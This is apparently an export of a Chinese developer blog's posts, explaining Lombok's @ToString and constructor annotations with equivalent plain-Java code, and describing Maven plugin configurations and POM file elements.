<p>类使用@ToString注解，Lombok会生成一个toString()方法，默认情况下，会输出类名、所有属性（会按照属性定义顺序），用逗号来分割。<br>
通过将includeFieldNames参数设为true，就能明确的输出toString()属性。这一点是不是有点绕口，通过代码来看会更清晰些。</p>
<p>使用Lombok的示例：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">ToString</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@ToString</span><span class="token punctuation">(</span>exclude <span class="token operator">=</span> <span class="token string">"id"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ToStringExample</span> <span class="token punctuation">{</span>

  <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token constant">STATIC_VAR</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
  <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
  <span class="token keyword">private</span> <span class="token class-name">Shape</span> shape <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Square</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">private</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> tags<span class="token punctuation">;</span>
  <span class="token keyword">private</span> <span class="token keyword">int</span> id<span class="token punctuation">;</span>

  <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token annotation punctuation">@ToString</span><span class="token punctuation">(</span>callSuper <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">,</span> includeFieldNames <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">)</span>
  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Square</span> <span class="token keyword">extends</span> <span class="token class-name">Shape</span> <span class="token punctuation">{</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> width<span class="token punctuation">,</span> height<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">Square</span><span class="token punctuation">(</span><span class="token keyword">int</span> width<span class="token punctuation">,</span> <span class="token keyword">int</span> height<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>width <span class="token operator">=</span> width<span class="token punctuation">;</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>height <span class="token operator">=</span> height<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>不使用Lombok的示例如下</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>hots</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Arrays</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ToStringExample</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token constant">STATIC_VAR</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">Shape</span> shape <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Square</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> tags<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> id<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Square</span> <span class="token keyword">extends</span> <span class="token class-name">Shape</span> <span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> width<span class="token punctuation">,</span> height<span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token class-name">Square</span><span class="token punctuation">(</span><span class="token keyword">int</span> width<span class="token punctuation">,</span> <span class="token keyword">int</span> height<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>width <span class="token operator">=</span> width<span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>height <span class="token operator">=</span> height<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token string">"Square(super="</span> <span class="token operator">+</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", width="</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>width <span class="token operator">+</span> <span class="token string">", height="</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>height <span class="token operator">+</span> <span class="token string">")"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">"ToStringExample("</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", "</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>shape <span class="token operator">+</span> <span class="token string">", "</span> <span class="token operator">+</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">deepToString</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>tags<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">")"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="NoArgsConstructor、-RequiredArgsConstructor、-AllArgsConstructor">@NoArgsConstructor、@RequiredArgsConstructor、@AllArgsConstructor</h2>
<p>无参构造器、部分参数构造器、全参构造器。作用于类上，用于生成构造函数。有staticName、access等属性。staticName属性一旦设定，将采用静态方法的方式生成实例，access属性可以限定访问权限。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@NoArgsConstructor</span>：生成无参构造器；
<span class="token annotation punctuation">@RequiredArgsConstructor</span>：生成包含<span class="token keyword">final</span>和<span class="token annotation punctuation">@NonNull</span>注解的成员变量的构造器；
<span class="token annotation punctuation">@AllArgsConstructor</span>：生成全参构造器<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>Lombok没法实现多种参数构造器的重载。<br>
Lombok示例代码如下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">AccessLevel</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">AllArgsConstructor</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">NonNull</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">RequiredArgsConstructor</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@RequiredArgsConstructor</span><span class="token punctuation">(</span>staticName <span class="token operator">=</span> <span class="token string">"of"</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@AllArgsConstructor</span><span class="token punctuation">(</span>access <span class="token operator">=</span> <span class="token class-name">AccessLevel</span><span class="token punctuation">.</span><span class="token constant">PROTECTED</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConstructorExample</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>

  <span class="token keyword">private</span> <span class="token keyword">int</span> x<span class="token punctuation">,</span> y<span class="token punctuation">;</span>

  <span class="token annotation punctuation">@NonNull</span>
  <span class="token keyword">private</span> <span class="token class-name">T</span> description<span class="token punctuation">;</span>

  <span class="token annotation punctuation">@NoArgsConstructor</span>
  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">NoArgsExample</span> <span class="token punctuation">{</span>

    <span class="token annotation punctuation">@NonNull</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> field<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>不使用Lombok的示例如下</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConstructorExample</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>

  <span class="token keyword">private</span> <span class="token keyword">int</span> x<span class="token punctuation">,</span> y<span class="token punctuation">;</span>

  <span class="token annotation punctuation">@NonNull</span>
  <span class="token keyword">private</span> <span class="token class-name">T</span> description<span class="token punctuation">;</span>

  <span class="token keyword">private</span> <span class="token class-name">ConstructorExample</span><span class="token punctuation">(</span><span class="token class-name">T</span> description<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>description <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">NullPointerException</span><span class="token punctuation">(</span><span class="token string">"description"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>description <span class="token operator">=</span> description<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">ConstructorExample</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token function">of</span><span class="token punctuation">(</span><span class="token class-name">T</span> description<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ConstructorExample</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span>description<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token annotation punctuation">@java.beans.ConstructorProperties</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token string">"x"</span><span class="token punctuation">,</span> <span class="token string">"y"</span><span class="token punctuation">,</span> <span class="token string">"description"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token keyword">protected</span> <span class="token class-name">ConstructorExample</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">,</span> <span class="token class-name">T</span> description<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>description <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">NullPointerException</span><span class="token punctuation">(</span><span class="token string">"description"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">=</span> x<span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">=</span> y<span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>description <span class="token operator">=</span> description<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">NoArgsExampmle</span> <span class="token punctuation">{</span>

    <span class="token annotation punctuation">@NonNull</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> field<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">NoArgsExample</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Log">@Log</h2>
<p>作用于类上，生成日志变量。针对不同的日志实现产品，有不同的注解</p>
]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>Lombox</tag>
      </tags>
  </entry>
  <entry>
    <title>Maven使用场景记录</title>
    <url>/20221030/4a3536f5.html</url>
    <content><![CDATA[<h1>Compile的设置</h1>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project</span> <span class="token attr-name">...</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugins</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.maven.plugins<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>maven-compiler-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>3.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span><span class="token punctuation">&gt;</span></span>${maven.compiler.source}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>source</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>target</span><span class="token punctuation">&gt;</span></span>${maven.compiler.target}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>target</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>encoding</span><span class="token punctuation">&gt;</span></span>${project.build.sourceEncoding}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>encoding</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugins</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project</span><span class="token punctuation">&gt;</span></span>	<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>SpringBoot项目打包</h1>
<blockquote>
<p>使用spring-boot-maven-plugin插件，指定运行主类</p>
</blockquote>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugins</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-maven-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>${springboot.version}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mainClass</span><span class="token punctuation">&gt;</span></span>com.local.learn.producer.ProducerApplication<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mainClass</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>executions</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>execution</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>goals</span><span class="token punctuation">&gt;</span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>goal</span><span class="token punctuation">&gt;</span></span>repackage<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>goal</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>goals</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>execution</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>executions</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugins</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>建立可執行JAR</h1>
<blockquote>
<p>使用maven-jar-plugin 插件，main函数作为入口</p>
</blockquote>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugins</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.maven.plugins<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>maven-jar-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>3.3.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>archive</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>manifest</span><span class="token punctuation">&gt;</span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>addClasspath</span><span class="token punctuation">&gt;</span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>addClasspath</span><span class="token punctuation">&gt;</span></span>
                        <span class="token comment">&lt;!-- main函数所在的类 --&gt;</span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mainClass</span><span class="token punctuation">&gt;</span></span>org.local.Main<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mainClass</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>manifest</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>archive</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugins</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1></h1>
]]></content>
      <categories>
        <category>软件工具</category>
      </categories>
      <tags>
        <tag>Maven</tag>
      </tags>
  </entry>
  <entry>
    <title>POM.XML文件说明</title>
    <url>/20221030/9926a393.html</url>
    <content><![CDATA[<h1>POM文件结构</h1>
<h2 id="父模块信息：parent">父模块信息：parent</h2>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>parent</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.local<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>learn<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>0.0.1-SNAPSHOT<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>relativePath</span><span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>parent</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ol>
<li>relativePath：父模块pom.xml文件的相对路径。默认<code>../pom.xml</code>。Maven首先在文件系统上的这个位置查找父POM，然后在本地存储库中查找，最后在远程repo中查找。</li>
</ol>
<h2 id="项目信息">项目信息</h2>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>
         <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modelVersion</span><span class="token punctuation">&gt;</span></span>4.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modelVersion</span><span class="token punctuation">&gt;</span></span> 
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.local<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>learn<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>0.0.1-SNAPSHOT<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span>learn<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span>learn<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>packaging</span><span class="token punctuation">&gt;</span></span>pom<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>packaging</span><span class="token punctuation">&gt;</span></span>
    ...
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ol>
<li>project：是所有pom.xml的根元素，并且在里面定义了命名空间和xsd元素；</li>
<li>modelVersion：当前pom模型的版本；</li>
<li>groupId：定义当前maven项目隶属的实际项目，并会根据这给项目建立包结构；</li>
<li>artifactId：定义项目中的某个模块名称（parent中），如果只有一个模块那就是项目的名称；</li>
<li>version：定义maven项目当前所处的版本号，默认0.0.1-SNAPSHOT为快照版本；</li>
<li>packaging：定义maven项目的打包方式，可以是jar包、war包、pom；</li>
